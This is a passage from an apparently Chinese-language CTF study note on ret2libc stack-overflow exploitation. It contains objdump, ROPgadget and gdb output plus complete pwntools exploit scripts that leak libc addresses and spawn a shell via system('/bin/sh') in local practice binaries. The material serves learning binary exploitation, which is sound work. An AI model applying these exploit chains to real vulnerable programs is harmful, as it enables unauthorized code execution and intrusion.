class="line">giantbranch@ubuntu:~/Desktop/CTF$ objdump -dj .plt ret2libc2</span><br><span class="line"></span><br><span class="line">ret2libc2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048440 &lt;printf@plt-0x10&gt;:</span><br><span class="line"> 8048440:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048446:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804844c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048450 &lt;printf@plt&gt;:</span><br><span class="line"> 8048450:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048456:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804845b:e9 e0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;gets@plt&gt;:</span><br><span class="line"> 8048460:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048466:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804846b:e9 d0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048470 &lt;time@plt&gt;:</span><br><span class="line"> 8048470:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048476:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804847b:e9 c0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048480 &lt;puts@plt&gt;:</span><br><span class="line"> 8048480:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 8048486:68 18 00 00 00       push   $0x18</span><br><span class="line"> 804848b:e9 b0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048490 &lt;system@plt&gt;:</span><br><span class="line"> 8048490:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 8048496:68 20 00 00 00       push   $0x20</span><br><span class="line"> 804849b:e9 a0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484a0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80484a0:ff 25 20 a0 04 08    jmp    *0x804a020</span><br><span class="line"> 80484a6:68 28 00 00 00       push   $0x28</span><br><span class="line"> 80484ab:e9 90 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484b0 &lt;srand@plt&gt;:</span><br><span class="line"> 80484b0:ff 25 24 a0 04 08    jmp    *0x804a024</span><br><span class="line"> 80484b6:68 30 00 00 00       push   $0x30</span><br><span class="line"> 80484bb:e9 80 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80484c0:ff 25 28 a0 04 08    jmp    *0x804a028</span><br><span class="line"> 80484c6:68 38 00 00 00       push   $0x38</span><br><span class="line"> 80484cb:e9 70 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484d0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80484d0:ff 25 2c a0 04 08    jmp    *0x804a02c</span><br><span class="line"> 80484d6:68 40 00 00 00       push   $0x40</span><br><span class="line"> 80484db:e9 60 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484e0 &lt;rand@plt&gt;:</span><br><span class="line"> 80484e0:ff 25 30 a0 04 08    jmp    *0x804a030</span><br><span class="line"> 80484e6:68 48 00 00 00       push   $0x48</span><br><span class="line"> 80484eb:e9 50 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484f0 &lt;__isoc99_scanf@plt&gt;:</span><br><span class="line"> 80484f0:ff 25 34 a0 04 08    jmp    *0x804a034</span><br><span class="line"> 80484f6:68 50 00 00 00       push   $0x50</span><br><span class="line"> 80484fb:e9 40 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br></pre></td></tr></table></figure><p>找到bss段的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br><span class="line">.bss:0804A080                               ; char buf2[100]</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure><p>再用<code>gdb-&gt;start-&gt;vmmap</code>查看bss段是否可执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Start       End    Perm     Size             Offset File</span><br><span class="line">0x804a000  0x804b000 rw-p     1000   1000 /home/hno/Desktop/CTF/ret2libc3</span><br></pre></td></tr></table></figure><p>除此以外，还有另一种构建payload的办法，利用ebx来传递参数，那么就需要寻找对应的gadgets：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ret2libc2 --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>接下来就是构建payload</p><p>一个办法是：</p><table><thead><tr><th>‘a’*112</th><th>填充</th></tr></thead><tbody><tr><td>gets_addr</td><td>返回到gets</td></tr><tr><td>sys_addr</td><td>gets返回地址，再次输入&#x2F;bin&#x2F;sh</td></tr><tr><td>bss_addr</td><td>gets写到什么地方，sys返回地址</td></tr><tr><td>bss_addr</td><td></td></tr></tbody></table><p>那么如果用第二种办法就是调用gets函数以后，把参数buf2给pop掉，这样的话返回地址就变成了system</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>或是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">gets_plt=<span class="number">0x8048460</span> </span><br><span class="line">system_plt=<span class="number">0x8048490</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span> </span><br><span class="line">buf2=<span class="number">0x804a080</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>,buf2])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="示例复现3"><a href="#示例复现3" class="headerlink" title="示例复现3"></a>示例复现3</h3><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中找不到system函数和‘&#x2F;bin&#x2F;sh’的地址，那么就要用到前面提到过的libc泄露了</p><p>可以根据上述步骤先得到libc再在程序中查询偏移，然后获得system函数地址，可以利用工具：</p><p><a href="https://github.com/lieanu/LibcSearcher">lieanu&#x2F;LibcSearcher: glibc offset search for ctf. (github.com)</a></p><p>libc中也是有’&#x2F;bin&#x2F;sh’字符串的，所以可以一起获得。</p><p>这里泄露__libc_start_main函数，因为它是程序最初被执行的地方，思路如下：</p><ul><li>泄露__libc_start_main 地址</li><li>获取libc版本</li><li>获取system地址和&#x2F;bin&#x2F;sh地址</li><li>再次执行源程序</li><li>触发栈溢出执行system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>先通过elf获得puts函数的plt表值，__libc_start_main的got表值，还有main函数的地址，用来第二次触发漏洞</p><p>再利用__libc_start_main得到的libc版本，通过LibcSearcher得到函数的偏移量</p><p>（有时候LibcSearcher不好使，可以用<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc database search (blukat.me)</a>）</p><p>那么总的思路就是：</p><ul><li>通过第一次溢出，来将puts函数的PLT地址放到返回处，泄露出执行过的函数的GOT地址</li><li>将puts返回地址设置为_start函数</li><li>通过泄露的函数的GOT地址计算出libc中的system和&#x2F;bin&#x2F;sh地址</li><li>再次溢出将返回地址覆盖为泄露出来的system的地址</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5">Basic-ROP (yuque.com)</a></p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
